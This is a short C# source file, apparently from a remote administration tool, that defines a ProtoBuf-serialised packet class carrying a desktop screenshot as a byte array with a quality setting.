using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DesktopResponse : IPacket
    {
        public DesktopResponse()
        {
        }

        public DesktopResponse(byte[] image, int quality)
        {
            Image = image;
            Quality = quality;
        }

        [ProtoMember(1)]
        public byte[] Image { get; set; }

        [ProtoMember(2)]
        public int Quality { get; set; }

        public void Execute(Client client)
        {
            client.Send<DesktopResponse>(this);
        }
    }
}